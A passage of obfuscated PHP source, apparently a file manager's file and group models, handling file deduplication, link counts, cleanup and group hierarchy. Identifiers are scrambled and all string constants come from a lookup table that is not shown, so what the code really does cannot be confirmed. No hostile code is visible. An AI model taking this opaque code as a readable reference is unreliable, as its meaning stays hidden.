"\151\x6f\x5f\x66\151\x6c\145\137\x6d\x65\164\141", "\x6d\145\164\141\106\x69\x65\x6c\x64" => "\x66\x69\154\145\x49\x44"); public function fileInfo($É©²Á’ş) { $î»Ò«„œ =& $_SERVER[ïÃ°£«Ê]; static $ÁüßÄªë = array(); if (!isset($ÁüßÄªë[$É©²Á’ş])) { $ùâ˜ù»ø = $î»Ò«„œ[2236]; $Ş÷ÉÙ°ö = Model($î»Ò«„œ[560])->field($ùâ˜ù»ø)->where(array($î»Ò«„œ[558] => $É©²Á’ş))->find(); $ÁüßÄªë[$É©²Á’ş] = $Ş÷ÉÙ°ö; } return $ÁüßÄªë[$É©²Á’ş]; } public function addFileByContent($× ì¤š§ = '', $À¢§¡†¼, $Õ‰ìÎ£ = '') { $…Ë×¶‹Ó =& $_SERVER[ïÃ°£«Ê]; $•Õğ¤Îş = TEMP_PATH . $…Ë×¶‹Ó[2237]; if (!is_dir($•Õğ¤Îş)) { mk_dir($•Õğ¤Îş); } $ó ¸°”‡ = $•Õğ¤Îş . $…Ë×¶‹Ó[2238] . rand_string(16); $ï‚¯“­Î = file_put_contents($ó ¸°”‡, $× ì¤š§); if ($ï‚¯“­Î === !1 || strlen($× ì¤š§) != $ï‚¯“­Î) { return !1; } $ÙËçéŞ§ = $this->addFile($ó ¸°”‡, $À¢§¡†¼, $Õ‰ìÎ£, !0); if (file_exists($ó ¸°”‡)) { @unlink($ó ¸°”‡); } return $ÙËçéŞ§; } public function createFileName($Êß÷€Ğ¯, $İı¦Ñëš, $âÇ½ÙÊ = false, $í©äŒ› = false) { $’®Ï‘ü¿ =& $_SERVER[ïÃ°£«Ê]; $ ±ÛÂş  = IO::init($’®Ï‘ü¿[8]); $ÊãÍİëœ = $this->_makeFilePath($Êß÷€Ğ¯, $İı¦Ñëš, $ ±ÛÂş , $âÇ½ÙÊ, $í©äŒ›); $Ú¢ç•éí = $ ±ÛÂş ->pathFather($ÊãÍİëœ); static $´ÜÌò×Å = false; $¶™­¦®Ø = $’®Ï‘ü¿[2239] . md5($Ú¢ç•éí); if (!$´ÜÌò×Å && !Cache::get($¶™­¦®Ø)) { $´ÜÌò×Å = !0; $şË‹œáê = IO::mkdir($Ú¢ç•éí); if (!IO::exist($şË‹œáê . $’®Ï‘ü¿[900])) { IO::mkfile($şË‹œáê . $’®Ï‘ü¿[900]); } Cache::set($¶™­¦®Ø, 1, 3600 * 2); } return $ÊãÍİëœ; } public function _makeFilePath($ÃßèØí¤, $¬”êÊÙö, $¯şÄıŒ, $¡Ş°øÊœ = false, $™òò€ = false) { $Ô¬é³ÌÜ =& $_SERVER[ïÃ°£«Ê]; $Ã«ï¼ìÊ = Model($Ô¬é³ÌÜ[874])->get($Ô¬é³ÌÜ[2240]); $å¯–Œ§¢ = $Ô¬é³ÌÜ[1429] . $¬”êÊÙö[$Ô¬é³ÌÜ[487]] . $Ô¬é³ÌÜ[499] . date($Ô¬é³ÌÜ[2241]); $•Ä®´­ª = $å¯–Œ§¢ . rand_string(5) . short_id(100); $ÃßèØí¤ = str_replace($Ô¬é³ÌÜ[8], $Ô¬é³ÌÜ[11], KodIO::clear($ÃßèØí¤)); $¼†Ëòò = $¯şÄıŒ->ext($ÃßèØí¤); if (!$ÃßèØí¤) { $Ã«ï¼ìÊ = $Ô¬é³ÌÜ[945]; } switch ($Ã«ï¼ìÊ) { case $Ô¬é³ÌÜ[2242]: if ($¼†Ëòò) { $•Ä®´­ª = $•Ä®´­ª . $Ô¬é³ÌÜ[10] . $¼†Ëòò; } if ($¼†Ëòò == $Ô¬é³ÌÜ[2177]) { $•Ä®´­ª .= $Ô¬é³ÌÜ[1398]; } break; case $Ô¬é³ÌÜ[2243]: $¥·îªÀ = Model($Ô¬é³ÌÜ[874])->get($Ô¬é³ÌÜ[875]); $öª¸ãØö = substr(md5($Ô¬é³ÌÜ[876] . $¥·îªÀ . date($Ô¬é³ÌÜ[850])), 0, 8); $å¯–Œ§¢ = $Ô¬é³ÌÜ[1429] . $¬”êÊÙö[$Ô¬é³ÌÜ[487]] . $Ô¬é³ÌÜ[499] . date($Ô¬é³ÌÜ[2244]) . $öª¸ãØö . $Ô¬é³ÌÜ[8]; if ($¼†Ëòò == $Ô¬é³ÌÜ[2177]) { $ÃßèØí¤ .= $Ô¬é³ÌÜ[1398]; } $²ªà‡ÑÔ = $Ô¬é³ÌÜ[2245] . $å¯–Œ§¢ . $ÃßèØí¤; CacheLock::lock($²ªà‡ÑÔ); $•Ä®´­ª = $å¯–Œ§¢ . $ÃßèØí¤; if (IO::exist($å¯–Œ§¢ . $ÃßèØí¤)) { $ÃüÀœù¤ = substr($ÃßèØí¤, 0, strlen($ÃßèØí¤) - strlen($¼†Ëòò)); $Õ™²÷Åµ = $™òò€ ? substr($™òò€, 0, 5) : ($¡Ş°øÊœ ? substr($¡Ş°øÊœ, 0, 5) : rand_string(5)); $Õ™²÷Åµ .= rand_string(3); $•Ä®´­ª = $å¯–Œ§¢ . $ÃüÀœù¤ . $Õ™²÷Åµ; if ($¼†Ëòò) { $•Ä®´­ª = $•Ä®´­ª . $Ô¬é³ÌÜ[10] . $¼†Ëòò; } } if (IO::isOsDriver($•Ä®´­ª) && !IO::isUploadServer($•Ä®´­ª)) { if (IO::exist($•Ä®´­ª)) { CacheLock::unlock($²ªà‡ÑÔ); return $•Ä®´­ª; } $Õ„ÖÔ = IO::setContent($•Ä®´­ª, $Ô¬é³ÌÜ[12]); if (!$Õ„ÖÔ) { show_json($Ô¬é³ÌÜ[2246], !1); } } CacheLock::unlock($²ªà‡ÑÔ); break; case $Ô¬é³ÌÜ[945]: break; default: break; } return $•Ä®´­ª; } public function addFileByRemote($·“¨êŞû, $‘’´…Ÿ, $Ğµ·ãÑØ = array()) { $¨ŸÓ¿Ÿ =& $_SERVER[ïÃ°£«Ê]; if (!IO::isFile($·“¨êŞû)) { return !1; } $Ã…‚½ë‡ = $Ğµ·ãÑØ[$¨ŸÓ¿Ÿ[563]] ? $Ğµ·ãÑØ[$¨ŸÓ¿Ÿ[563]] : $¨ŸÓ¿Ÿ[12]; $Âëò³Ô· = IO::hashMd5($·“¨êŞû, $Ã…‚½ë‡); $»¤‡¯¸Ì = KodIO::parse($·“¨êŞû); $„ùØ¢é = array($¨ŸÓ¿Ÿ[640] => IO::size($·“¨êŞû), $¨ŸÓ¿Ÿ[2247] => 1, $¨ŸÓ¿Ÿ[509] => $‘’´…Ÿ, $¨ŸÓ¿Ÿ[916] => $»¤‡¯¸Ì[$¨ŸÓ¿Ÿ[487]], $¨ŸÓ¿Ÿ[510] => $·“¨êŞû, $¨ŸÓ¿Ÿ[2248] => $Ğµ·ãÑØ[$¨ŸÓ¿Ÿ[694]] ? $Ğµ·ãÑØ[$¨ŸÓ¿Ÿ[694]] : IO::hashSimple($·“¨êŞû), $¨ŸÓ¿Ÿ[2249] => $Âëò³Ô· ? $Âëò³Ô· : $Ã…‚½ë‡); if ($““®”¶ú = $this->addFileCheckExist($„ùØ¢é[$¨ŸÓ¿Ÿ[694]], $„ùØ¢é[$¨ŸÓ¿Ÿ[563]], $„ùØ¢é[$¨ŸÓ¿Ÿ[79]])) { return $““®”¶ú; } return $this->addFileData($„ùØ¢é); } private function addFileData($ÉëÓ¨ü´) { $‚ô»Ï›¨ =& $_SERVER[ïÃ°£«Ê]; if (!$ÉëÓ¨ü´) { return !1; } if (!IO::isFile($ÉëÓ¨ü´[$‚ô»Ï›¨[87]])) { return !1; } $ÉëÓ¨ü´[$‚ô»Ï›¨[79]] = intval($ÉëÓ¨ü´[$‚ô»Ï›¨[79]]); if (!$ÉëÓ¨ü´[$‚ô»Ï›¨[79]] && strlen($ÉëÓ¨ü´[$‚ô»Ï›¨[694]]) > 32) { $ÉëÓ¨ü´[$‚ô»Ï›¨[79]] = intval(substr($ÉëÓ¨ü´[$‚ô»Ï›¨[694]], 32)); } $¦Â†˜° = $this->add($ÉëÓ¨ü´); return $this->find($¦Â†˜°); } public function addFile($­™üÌ ü, $Ï½™¢¸, $ï¹Å˜ª¼, $Í„å«ßÎ = false) { $ÊµØ¬õä =& $_SERVER[ïÃ°£«Ê]; $ ½À›£´ = IO::hashSimple($­™üÌ ü); $È†š•ı = IO::size($­™üÌ ü); $£‹õ¼ = $È†š•ı <= 1024 * 1024 * 10 ? IO::hashMd5($­™üÌ ü) : $ÊµØ¬õä[12]; $ü— ¯ŒÍ = $ÊµØ¬õä[2250] . $ ½À›£´; CacheLock::lock($ü— ¯ŒÍ); if ($£‹õ¼ && $ ½À›£´) { $àÇ = $this->addFileCheckExist($ ½À›£´, $£‹õ¼, $È†š•ı); if ($àÇ) { CacheLock::unlock($ü— ¯ŒÍ); return $àÇ; } } $ç¿şãÑ÷ = $this->addFileMake($­™üÌ ü, $Ï½™¢¸, $È†š•ı, $ ½À›£´, $£‹õ¼, $ï¹Å˜ª¼, $Í„å«ßÎ); $–‹ë­Õ = $this->addFileData($ç¿şãÑ÷); if (!$–‹ë­Õ) { return !1; } CacheLock::unlock($ü— ¯ŒÍ); if (!$£‹õ¼ && $–‹ë­Õ) { $this->fileMd5Check($–‹ë­Õ); } return $–‹ë­Õ; } public function fileMd5Check($Ïº€òøÙ) { $‹âÊÅ•Ã =& $_SERVER[ïÃ°£«Ê]; $ìò»ïË¡ = array($Ïº€òøÙ[$‹âÊÅ•Ã[557]], $Ïº€òøÙ[$‹âÊÅ•Ã[87]]); $÷‰¶÷Õì = $‹âÊÅ•Ã[2251] . $Ïº€òøÙ[$‹âÊÅ•Ã[87]]; $»ƒÕÙÙ = $‹âÊÅ•Ã[2252] . $Ïº€òøÙ[$‹âÊÅ•Ã[557]]; TaskQueue::add($‹âÊÅ•Ã[2253], $ìò»ïË¡, $÷‰¶÷Õì, $»ƒÕÙÙ); } public function fileMd5Set($÷÷¤áÂ§, $şÎ’Ó¥) { $ Ğİœ°™ =& $_SERVER[ïÃ°£«Ê]; $ĞÈ‚‡ë¯ = $this->find($÷÷¤áÂ§); if (!$ĞÈ‚‡ë¯ || $ĞÈ‚‡ë¯[$ Ğİœ°™[563]]) { return; } $âÕ‹¢Œ = IO::hashMd5($şÎ’Ó¥); if (!$âÕ‹¢Œ) { return $ Ğİœ°™[12]; } $this->where(array($ Ğİœ°™[557] => $÷÷¤áÂ§))->save(array($ Ğİœ°™[563] => $âÕ‹¢Œ)); } public function addFileMake($Æ…¤ÜÜã, $Şá‰»‡É, $ÔÍ¬’×, $¹¸ÕÖ®», $¨²Ïµ, $íÚÌ›Ş¸, $ÍÕ·õç½) { $ø±üôÓÒ =& $_SERVER[ïÃ°£«Ê]; $÷ã÷„¶÷ = $this->createFileName($íÚÌ›Ş¸, $Şá‰»‡É, $¹¸ÕÖ®», $¨²Ïµ); $Ñ“ê÷Í¼ = get_path_father($÷ã÷„¶÷); $‹É…Õ®İ = get_path_this($÷ã÷„¶÷); if ($ÍÕ·õç½) { $‡¤Ô»‡Æ = IO::move($Æ…¤ÜÜã, $Ñ“ê÷Í¼, !1, $‹É…Õ®İ); } else { $‡¤Ô»‡Æ = IO::copy($Æ…¤ÜÜã, $Ñ“ê÷Í¼, !1, $‹É…Õ®İ); } if (!$‡¤Ô»‡Æ) { return !1; } $±ÈÛ‰ÖÉ = IO::init($‡¤Ô»‡Æ); $±ÈÛ‰ÖÉ->cacheMethod($ø±üôÓÒ[179], $±ÈÛ‰ÖÉ->path, $ø±üôÓÒ[176]); if (IO::size($‡¤Ô»‡Æ) != $ÔÍ¬’×) { return !1; } $«ÇÎ°†â = array($ø±üôÓÒ[640] => $ÔÍ¬’×, $ø±üôÓÒ[2247] => 1, $ø±üôÓÒ[509] => $íÚÌ›Ş¸, $ø±üôÓÒ[916] => $Şá‰»‡É[$ø±üôÓÒ[487]], $ø±üôÓÒ[510] => $÷ã÷„¶÷, $ø±üôÓÒ[2248] => $¹¸ÕÖ®», $ø±üôÓÒ[2249] => $¨²Ïµ); return $«ÇÎ°†â; } public function addFileCheckExist($½®ŠÉİÒ, $½êã²«¥, $‚ûíêïÜ) { $ªéÆØò =& $_SERVER[ïÃ°£«Ê]; $Ì«¦¡é‚ = $this->findByHash($½®ŠÉİÒ, $½êã²«¥); if (!$Ì«¦¡é‚) { return !1; } $çõË¥”¹ = array($ªéÆØò[2247] => intval($Ì«¦¡é‚[$ªéÆØò[2254]]) + 1, $ªéÆØò[640] => $‚ûíêïÜ); $this->where(array($ªéÆØò[558] => $Ì«¦¡é‚[$ªéÆØò[557]]))->save($çõË¥”¹); return $Ì«¦¡é‚; } public function remove($œ®²òŞğ) { $this->linkCountChange($œ®²òŞğ, !1); $this->clearEmpty(); return !0; } public function linkAdd($”Ş‘‚¬İ) { $this->linkCountChange($”Ş‘‚¬İ, !0); } public function linkCountChange($¤ÛÍ™®, $ ßœĞ) { $÷Å²¶ş =& $_SERVER[ïÃ°£«Ê]; if (!$¤ÛÍ™®) { return; } if (!is_array($¤ÛÍ™®)) { $¤ÛÍ™® = array($¤ÛÍ™®); } $ùäòÅùç = array(); foreach ($¤ÛÍ™® as $à¥ë¹Ò») { $„Û™ÇîÙ = $à¥ë¹Ò» . $÷Å²¶ş[12]; if (!$ùäòÅùç[$„Û™ÇîÙ]) { $ùäòÅùç[$„Û™ÇîÙ] = 0; } $ùäòÅùç[$„Û™ÇîÙ]++; } $ÜÚê™ = array(); foreach ($ùäòÅùç as $à¥ë¹Ò» => $¸ƒ¨ŸÂš) { $„Û™ÇîÙ = $¸ƒ¨ŸÂš . $÷Å²¶ş[12]; if (!$ÜÚê™[$„Û™ÇîÙ]) { $ÜÚê™[$„Û™ÇîÙ] = array(); } $ÜÚê™[$„Û™ÇîÙ][] = $à¥ë¹Ò»; } foreach ($ÜÚê™ as $¸ƒ¨ŸÂš => $Ş¸´³ŸÆ) { if (!$Ş¸´³ŸÆ) { continue; } $¸ƒ¨ŸÂš = $ ßœĞ ? $¸ƒ¨ŸÂš : -intval($¸ƒ¨ŸÂš); $Ò¤Œ˜ÂÂ = array($÷Å²¶ş[557] => array($÷Å²¶ş[7], $Ş¸´³ŸÆ)); if ($¸ƒ¨ŸÂš < 0) { $Ò¤Œ˜ÂÂ[$÷Å²¶ş[2254]] = array($÷Å²¶ş[1183], abs($¸ƒ¨ŸÂš)); } $this->where($Ò¤Œ˜ÂÂ)->setAdd($÷Å²¶ş[2254], $¸ƒ¨ŸÂš); } } public function findByHash($à€…ª©, $Ô³®¹Ì¸ = false) { $‰‡¬îå =& $_SERVER[ïÃ°£«Ê]; if (!$à€…ª© && !$Ô³®¹Ì¸) { return !1; } $¦”À‹ˆÛ = array($‰‡¬îå[2248] => $à€…ª©); if ($Ô³®¹Ì¸) { $¦”À‹ˆÛ = array($‰‡¬îå[2249] => $Ô³®¹Ì¸); } return $this->order($‰‡¬îå[2255])->where($¦”À‹ˆÛ)->find(); } public function clearEmpty($àÓıß‰ = 1) { $³ÁÕ•üø =& $_SERVER[ïÃ°£«Ê]; $Ì¶ß«•² = time() - 3600 * 24 * $àÓıß‰; $Á’Ş‰®… = $³ÁÕ•üø[2256] . $Ì¶ß«•²; $êö¯±„ = $this->where($Á’Ş‰®…)->select(); if (!$êö¯±„) { return; } $À ûëëƒ = new Task($³ÁÕ•üø[2257], $³ÁÕ•üø[12], count($êö¯±„)); foreach ($êö¯±„ as $Œ©ååêÇ) { $À ûëëƒ->update(1); $this->resetFile($Œ©ååêÇ); } $À ûëëƒ->end(); } public function resetFile($óş–¯ğÚ) { $¹òç³…ü =& $_SERVER[ïÃ°£«Ê]; $£şò„¦™ = array($¹òç³…ü[558] => $óş–¯ğÚ[$¹òç³…ü[557]]); $­ù¥òªø = Model($¹òç³…ü[1535])->where($£şò„¦™)->count(); $ËŸá²Ì = Model($¹òç³…ü[2258])->where($£şò„¦™)->count(); $Øàªàâ® = intval($­ù¥òªø) + intval($ËŸá²Ì); if ($Øàªàâ® == 0) { Model($¹òç³…ü[2259])->delete($óş–¯ğÚ[$¹òç³…ü[557]]); $this->where($£şò„¦™)->delete(); $this->metaSet($óş–¯ğÚ[$¹òç³…ü[557]], null, null); if (!IO::isFile($óş–¯ğÚ[$¹òç³…ü[87]])) { write_log(array($¹òç³…ü[2260], ACTION, $óş–¯ğÚ), $¹òç³…ü[1373]); return !1; } IO::remove($óş–¯ğÚ[$¹òç³…ü[87]]); write_log(ACTION . $¹òç³…ü[987] . KodUser::id() . $¹òç³…ü[2261] . $óş–¯ğÚ[$¹òç³…ü[557]] . $¹òç³…ü[2048] . $óş–¯ğÚ[$¹òç³…ü[79]] . $¹òç³…ü[199] . $óş–¯ğÚ[$¹òç³…ü[87]], $¹òç³…ü[2260]); return; } if ($óş–¯ğÚ[$¹òç³…ü[2254]] != $Øàªàâ®) { $this->where($£şò„¦™)->save(array($¹òç³…ü[2247] => $Øàªàâ®)); } } public function storageInfo($•ÜøÊÉ = false) { $é—¡ÀŸ =& $_SERVER[ïÃ°£«Ê]; $ÙøˆÙ†— = $this->count() + 0.0; $¼Ú¶™øŞ = 0; $î„˜¬¡ = 1; $ìÓ£Åâä = 0; $ß…¡Éë‹ = 5000; for ($²È›“êÌ = 0; $²È›“êÌ < $ÙøˆÙ†—; $²È›“êÌ = $²È›“êÌ + $ß…¡Éë‹) { $ÚÄ”¾¥Í = $this->limit($²È›“êÌ, $ß…¡Éë‹)->select(); foreach ($ÚÄ”¾¥Í as $ğ‘»´Ñ«) { $î„˜¬¡ += $ğ‘»´Ñ«[$é—¡ÀŸ[79]] * $ğ‘»´Ñ«[$é—¡ÀŸ[2254]]; $¼Ú¶™øŞ += $ğ‘»´Ñ«[$é—¡ÀŸ[79]] * ($ğ‘»´Ñ«[$é—¡ÀŸ[2254]] - 1); $ìÓ£Åâä += $ğ‘»´Ñ«[$é—¡ÀŸ[2254]]; } } $‘²™ó = array($é—¡ÀŸ[2262] => $î„˜¬¡, $é—¡ÀŸ[2263] => $¼Ú¶™øŞ, $é—¡ÀŸ[2264] => $¼Ú¶™øŞ / $î„˜¬¡, $é—¡ÀŸ[83] => $ÙøˆÙ†—, $é—¡ÀŸ[2265] => $ìÓ£Åâä); return $‘²™ó; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\x75\x70"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\141\155\x65" => "\x67\x72\157\x75\160\137\x6d\x65\x74\x61", "\155\145\164\141\106\x69\145\154\x64" => "\x67\162\x6f\165\x70\111\104"); protected function cacheFunctionAlias($ûÒ©Î¿î) { $‘¬øûá =& $_SERVER[ïÃ°£«Ê]; return array($‘¬øûá[2266] => array($ûÒ©Î¿î[0], $‘¬øûá[2267]), $‘¬øûá[2268] => array($ûÒ©Î¿î[0], $‘¬øûá[2269])); } protected function ___getInfo($Ÿ‰¹“²à) { $¤°ã¯ºŞ = $this->getInfoSimple($Ÿ‰¹“²à); if (!$¤°ã¯ºŞ) { return !1; } return $this->_listDataApplyItem($¤°ã¯ºŞ); } protected function ___getInfoSimple($œÁşÀõ») { $¾Àãƒ·î = array($_SERVER[ïÃ°£«Ê][1497] => intval($œÁşÀõ»)); $“”®Ã£ = $this->where($¾Àãƒ·î)->find(); return is_array($“”®Ã£) ? $“”®Ã£ : array(); } protected function groupAdd($Õ¬Ê¼·‚) { $ºƒ¬Çã× =& $_SERVER[ïÃ°£«Ê]; if (!$Õ¬Ê¼·‚[$ºƒ¬Çã×[190]] && isset($Õ¬Ê¼·‚[$ºƒ¬Çã×[1497]]) && $Õ¬Ê¼·‚[$ºƒ¬Çã×[1497]] == 1) { if ($è¼°±Ò = $this->getInfoSimple($Õ¬Ê¼·‚[$ºƒ¬Çã×[1497]], !0)) { return $Õ¬Ê¼·‚[$ºƒ¬Çã×[1497]]; } } else { $è¼°±Ò = $this->getInfoSimple($Õ¬Ê¼·‚[$ºƒ¬Çã×[190]]); if (!$è¼°±Ò) { return !1; } } $¾“ôàÀì = $ºƒ¬Çã×[613]; if ($è¼°±Ò[$ºƒ¬Çã×[604]]) { $¾“ôàÀì = $è¼°±Ò[$ºƒ¬Çã×[604]] . $è¼°±Ò[$ºƒ¬Çã×[1497]] . $ºƒ¬Çã×[50]; } $ÍÖœÚé† = array($ºƒ¬Çã×[509] => $this->groupNameAuto($Õ¬Ê¼·‚[$ºƒ¬Çã×[190]], $Õ¬Ê¼·‚[$ºƒ¬Çã×[32]]), $ºƒ¬Çã×[492] => $Õ¬Ê¼·‚[$ºƒ¬Çã×[190]], $ºƒ¬Çã×[674] => $¾“ôàÀì, $ºƒ¬Çã×[2270] => $Õ¬Ê¼·‚[$ºƒ¬Çã×[2171]], $ºƒ¬Çã×[2271] => 0, $ºƒ¬Çã×[2189] => 0); $Õ¬Ê¼·‚[$ºƒ¬Çã×[32]] = $ÍÖœÚé†[$ºƒ¬Çã×[32]]; if (isset($Õ¬Ê¼·‚[$ºƒ¬Çã×[2207]])) { $ÍÖœÚé†[$ºƒ¬Çã×[2207]] = $Õ¬Ê¼·‚[$ºƒ¬Çã×[2207]]; } else { $íÄŞĞ õ = $this->max($ºƒ¬Çã×[2207]); if (!$íÄŞĞ õ) { $íÄŞĞ õ = 0; } $ÍÖœÚé†[$ºƒ¬Çã×[2207]] = $íÄŞĞ õ + 1; } if (!empty($Õ¬Ê¼·‚[$ºƒ¬Çã×[1497]])) { $ÍÖœÚé†[$ºƒ¬Çã×[1497]] = $Õ¬Ê¼·‚[$ºƒ¬Çã×[1497]]; } $ ‰§˜õ£ = $this->add($ÍÖœÚé†); $this->groupMetaEdit($ ‰§˜õ£, $Õ¬Ê¼·‚); Model($ºƒ¬Çã×[1535])->groupRootAdd($ ‰§˜õ£); $this->_clearCache($Õ¬Ê¼·‚[$ºƒ¬Çã×[190]]); return $ ‰§˜õ£; } protected function groupEdit($˜äß‚ , $Ëœ¬ëä’) { $ãÒ¸ğµí =& $_SERVER[ïÃ°£«Ê]; $±ğ¥£ÀÑ = $this->getInfoSimple($˜äß‚ ); if (!$±ğ¥£ÀÑ) { return !1; } if (!empty($Ëœ¬ëä’[$ãÒ¸ğµí[190]])) { $ë§™ãûÔ = $this->getInfoSimple($Ëœ¬ëä’[$ãÒ¸ğµí[190]]); if (!$ë§™ãûÔ) { return !1; } if ($±ğ¥£ÀÑ[$ãÒ¸ğµí[1497]] == $ë§™ãûÔ[$ãÒ¸ğµí[1497]]) { return !1; } if ($Ëœ¬ëä’[$ãÒ¸ğµí[190]] != $±ğ¥£ÀÑ[$ãÒ¸ğµí[190]]) { if ($ë§™ãûÔ[$ãÒ¸ğµí[604]] !== $±ğ¥£ÀÑ[$ãÒ¸ğµí[604]] && strpos($ë§™ãûÔ[$ãÒ¸ğµí[604]], $±ğ¥£ÀÑ[$ãÒ¸ğµí[604]] . $±ğ¥£ÀÑ[$ãÒ¸ğµí[1497]] . $ãÒ¸ğµí[50]) === 0) { return !1; } $Ëœ¬ëä’[$ãÒ¸ğµí[674]] = $ë§™ãûÔ[$ãÒ¸ğµí[604]] . $Ëœ¬ëä’[$ãÒ¸ğµí[190]] . $ãÒ¸ğµí[50]; $this->_changeChildLevel($±ğ¥£ÀÑ, $ë§™ãûÔ); $this->_clearCache($ë§™ãûÔ[$ãÒ¸ğµí[1497]]); $this->_clearCache($±ğ¥£ÀÑ[$ãÒ¸ğµí[190]]); } } $this->groupMetaEdit($˜äß‚ , $Ëœ¬ëä’); $this->_clearChildrenCache($±ğ¥£ÀÑ); return $this->where(array($ãÒ¸ğµí[2272] => $˜äß‚ ))->save($Ëœ¬ëä’); } private function groupMetaEdit($şëŠ¿œ, &$¦õ•ò‚á) { $ø‡ÀĞÜ =& $_SERVER[ïÃ°£«Ê]; if (isset($¦õ•ò‚á[$ø‡ÀĞÜ[32]])) { $this->setNamePinyin($şëŠ¿œ, $¦õ•ò‚á[$ø‡ÀĞÜ[32]]); } if (isset($¦õ•ò‚á[$ø‡ÀĞÜ[2273]])) { $§ÈÂÜÅ˜ = array($ø‡ÀĞÜ[2273] => $¦õ•ò‚á[$ø‡ÀĞÜ[2273]], $ø‡ÀĞÜ[2274] => $¦õ•ò‚á[$ø‡ÀĞÜ[2274]]); unset($¦õ•ò‚á[$ø‡ÀĞÜ[2273]]); unset($¦õ•ò‚á[$ø‡ÀĞÜ[2274]]); if (isset($¦õ•ò‚á[$ø‡ÀĞÜ[2275]])) { $Áêéî¦™ = $ø‡ÀĞÜ[1493] . $şëŠ¿œ; $À¸¶ˆãä = $ø‡ÀĞÜ[1492]; $ßî‘”­Œ = $¦õ•ò‚á[$ø‡ÀĞÜ[2275]] ? $¦õ•ò‚á[$ø‡ÀĞÜ[2275]] : $ø‡ÀĞÜ[12]; $çÄğÔØø = Model($ø‡ÀĞÜ[1491])->get($Áêéî¦™, $À¸¶ˆãä); $çÄğÔØø = $çÄğÔØø ? $çÄğÔØø : $ø‡ÀĞÜ[12]; if ($çÄğÔØø != $ßî‘”­Œ) { if (!$ßî‘”­Œ && $çÄğÔØø) { Model($ø‡ÀĞÜ[1491])->remove($Áêéî¦™, $À¸¶ˆãä); } else { if ($ßî‘”­Œ) { Model($ø‡ÀĞÜ[1491])->set($Áêéî¦™, $ßî‘”­Œ, $À¸¶ˆãä); } } } $§ÈÂÜÅ˜[$ø‡ÀĞÜ[2275]] = $ßî‘”­Œ; } $this->metaSet($şëŠ¿œ, $§ÈÂÜÅ˜); } } private function _clearChildrenCache($úíÜñú•) { $” ˆÌ–æ =& $_SERVER[ïÃ°£«Ê]; $ªúÁË±Â = array($” ˆÌ–æ[674] => array($” ˆÌ–æ[635], $úíÜñú•[$” ˆÌ–æ[604]] . $úíÜñú•[$” ˆÌ–æ[1497]] . $” ˆÌ–æ[636])); $Æè†ì¤Œ = $this->field($” ˆÌ–æ[1497])->where($ªúÁË±Â)->select(); foreach ($Æè†ì¤Œ as $“¹€˜şø) { $this->_clearCache($“¹€˜şø[$” ˆÌ–æ[1497]]); } } private function _clearCache($ñ–÷èœå) { $•óéœŸ =& $_SERVER[ïÃ°£«Ê]; $this->cacheFunctionClear($•óéœŸ[2276], $ñ–÷èœå); $this->cacheFunctionClear($•óéœŸ[2277], $ñ–÷èœå); } private function _changeChildLevel($æØ—Úôî, $’Şİáá, $üó†ú±Î = false) { $‡©Şœîå =& $_SERVER[ïÃ°£«Ê]; $Şª£¢ë = $æØ—Úôî[$‡©Şœîå[604]] . $æØ—Úôî[$‡©Şœîå[1497]] . $‡©Şœîå[50]; $¥¹Š¾õ— = $’Şİáá[$‡©Şœîå[604]] . $’Şİáá[$‡©Şœîå[1497]] . $‡©Şœîå[50] . $æØ—Úôî[$‡©Şœîå[1497]] . $‡©Şœîå[50]; if ($üó†ú±Î) { $¥¹Š¾õ— = $’Şİáá[$‡©Şœîå[604]] . $’Şİáá[$‡©Şœîå[1497]] . $‡©Şœîå[50]; } $³ÇÒéü = array($‡©Şœîå[674] => array($‡©Şœîå[635], $æØ—Úôî[$‡©Şœîå[604]] . $æØ—Úôî[$‡©Şœîå[1497]] . $‡©Şœîå[636])); $«ãğÏ‚ò = array($‡©Şœîå[674] => array($‡©Şœîå[683], "\x72\x65\160\154\x61\143\x65\x28\160\141\x72\x65\x6e\x74\114\x65\x76\145\154\x2c\47{$Şª£¢ë}\47\x2c\x27{$¥¹Š¾õ—}\x27\51")); $this->_clearChildrenCache($æØ—Úôî); $this->where($³ÇÒéü)->data($«ãğÏ‚ò)->save(); } public function setNamePinyin($©Ï°‘ÏŸ, $‰¤×ßŠ = false) { $¹ÊÄªü¾ =& $_SERVER[ïÃ°£«Ê]; if (!$‰¤×ßŠ) { $ñïèõ§¼ = $this->getInfoSimple($©Ï°‘ÏŸ); $‰¤×ßŠ = $ñïèõ§¼[$¹ÊÄªü¾[32]]; } if (!Input::check($‰¤×ßŠ, $¹ÊÄªü¾[677])) { $this->metaSet($©Ï°‘ÏŸ, $¹ÊÄªü¾[552], null); $this->metaSet($©Ï°‘ÏŸ, $¹ÊÄªü¾[551], null); return; } $¶ÉÏ»î’ = array($¹ÊÄªü¾[552] => str_replace($¹ÊÄªü¾[53], $¹ÊÄªü¾[12], Pinyin::get($‰¤×ßŠ)), $¹ÊÄªü¾[551] => Pinyin::get($‰¤×ßŠ, $¹ÊÄªü¾[678])); $this->metaSet($©Ï°‘ÏŸ, $¶ÉÏ»î’); } protected function metaSet($è¼š‰¢, $¨ûõ¿‡ = null, $Î÷»¸®€ = null) { $this->_clearCache($è¼š‰¢); return parent::metaSet($è¼š‰¢, $¨ûõ¿‡, $Î÷»¸®€); } protected function groupStatus($ç‡Æ°ö®, $é¾óÄğ…) { $ŞÈŠ¥Œ =& $_SERVER[ïÃ°£«Ê]; $Ò¨Ö®Èğ = $this->getInfoSimple($ç‡Æ°ö®); if (!$Ò¨Ö®Èğ) { return !1; } $this->_clearCache($ç‡Æ°ö®); return $this->metaSet($ç‡Æ°ö®, $ŞÈŠ¥Œ[851], $é¾óÄğ…); if ($é¾óÄğ… == $ŞÈŠ¥Œ[91]) { $§´ş‘½š = $this->parentLevelArray($Ò¨Ö®Èğ[$ŞÈŠ¥Œ[604]]); } else { } $§´ş‘½š[] = $Ò¨Ö®Èğ[$ŞÈŠ¥Œ[1497]]; $£§ŸãæÂ = array(); foreach ($§´ş‘½š as $ç‡Æ°ö®) { $£§ŸãæÂ[] = array($ŞÈŠ¥Œ[1497] => $ç‡Æ°ö®, $ŞÈŠ¥Œ[95] => $ŞÈŠ¥Œ[851], $ŞÈŠ¥Œ[451] => $é¾óÄğ…); $this->_clearCache($ç‡Æ°ö®); } return Model($ŞÈŠ¥Œ[2278])->addAll($£§ŸãæÂ, array(), !0); } protected function groupRemove($ãÄ—Êñ, $á»ûšü = false) { $…‡´ğßÖ =& $_SERVER[ïÃ°£«Ê]; 